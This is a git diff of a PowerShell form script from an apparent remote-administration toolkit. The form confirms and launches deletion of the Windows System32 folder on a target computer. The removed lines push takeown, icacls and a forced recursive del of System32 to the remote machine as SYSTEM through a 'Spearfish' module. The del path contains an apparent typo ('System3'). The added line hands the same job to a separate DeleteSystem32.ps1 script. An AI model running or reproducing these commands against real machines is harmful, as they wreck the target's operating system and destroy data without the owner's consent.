@@ -1,7 +1,7 @@
-#Name: DeleteSystem32
-#Description: Deletes all files possible in the Windows system32 file on the given computer
+#Name: DeleteSystem32Form
+#Description: The confirmation for deleting system32
 #Created by: Noah Kulas
-#Created date: Oct. 24, 2019
+#Created date: Jun. 1, 2020
 
 param([string]$Target)
 
@@ -19,11 +19,7 @@ function ConfirmButton_Click {
     $CancelButton.Enabled = $false
     $ConfirmTextbox.Enabled = $false
 
-    .\Modules\Spearfish.ps1 -Target $Target -Action "cmd.exe" -Arguments "/C takeown /F `"C:\Windows\System32`" /R" -AsSystem $true
-    Start-Sleep -Seconds 15
-    .\Modules\Spearfish.ps1 -Target $Target -Action "cmd.exe" -Arguments "/C icacls `"C:\Windows\System32\*`" /Grant SYSTEM:F" -AsSystem $true
-    Start-Sleep 15
-    .\Modules\Spearfish.ps1 -Target $Target -Action "cmd.exe" -Arguments "/C del `"C:\Windows\System3\*`" /F /S /Q" -AsSystem $true
+    Start-Process powershell.exe -ArgumentList "-File ..\BusinessLogic\DeleteSystem32.ps1", "-Target $Target" -WorkingDirectory "..\BusinessLogic"
 
     $ConfirmForm.Close()
 }
